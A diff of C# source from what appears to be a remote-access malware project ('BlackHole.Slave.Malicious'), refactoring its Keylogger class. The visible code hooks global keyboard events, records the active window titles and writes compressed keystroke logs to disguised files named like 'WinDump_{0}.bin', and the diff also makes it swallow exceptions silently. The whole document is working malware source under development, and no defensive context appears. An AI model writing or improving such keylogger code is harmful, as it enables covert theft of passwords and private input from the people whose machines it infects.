@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using BlackHole.Common;
+using BlackHole.Common.Extentions;
 using BlackHole.Slave.Helper;
 using Gma.System.MouseKeyHook;
 
@@ -15,7 +16,7 @@ namespace BlackHole.Slave.Malicious
     /// </summary>
     public class Keylogger : Singleton<Keylogger>, IMalicious
     {
-        private static string FileName = "WinDump_{0}.bin";
+        private static readonly string FileName = "WinDump_{0}.bin";
 
 #if DEBUG
         /// <summary>
@@ -31,9 +32,9 @@ namespace BlackHole.Slave.Malicious
         public const int FLUSH_INTERVAL = 60000 * 60;
 #endif
 
-        private StringBuilder m_logger = new StringBuilder();
-        private List<Keys> m_pressedKeys = new List<Keys>();
-        private List<char> m_pressedKeyChars = new List<char>();
+        private readonly StringBuilder m_logger = new StringBuilder();
+        private readonly List<Keys> m_pressedKeys = new List<Keys>();
+        private readonly List<char> m_pressedKeyChars = new List<char>();
         private string m_lastWindowTitle = string.Empty;
         private bool m_ignoreSpecialKeys;
         private IKeyboardMouseEvents m_events;
@@ -77,7 +78,7 @@ namespace BlackHole.Slave.Malicious
         /// 
         /// </summary>
         /// <param name="message"></param>
-        private void Append(object message) => m_logger.Append(message.ToString());
+        private void Append(object message) => m_logger.Append(message);
 
         /// <summary>
         /// 
@@ -184,7 +185,7 @@ namespace BlackHole.Slave.Malicious
                     if (string.IsNullOrEmpty(names[i]))
                         continue;
 
-                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"[{0}" : " + {0}", names[i]);
+                    specialKeys.AppendFormat(validSpecialKeys == 0 ? @"[{0}" : " + {0}", names[i]);
                     validSpecialKeys++;
                 }
                 
@@ -198,7 +199,8 @@ namespace BlackHole.Slave.Malicious
             for (int i = 0; i < names.Length; i++)
             {
                 m_pressedKeys.Remove(keys[i]);
-                if (string.IsNullOrEmpty(names[i])) continue;
+                if (string.IsNullOrEmpty(names[i]))
+                    continue;
 
                 switch (names[i])
                 {
@@ -228,7 +230,7 @@ namespace BlackHole.Slave.Malicious
                 File.WriteAllBytes(string.Format(filePath, DateTime.Now.ToString("dd_HH_mm")), Encoding.Default.GetBytes(m_logger.ToString()).CompressLz4());
                 m_logger.Clear();
             }
-            catch(Exception e)
+            catch
             {
             }
 
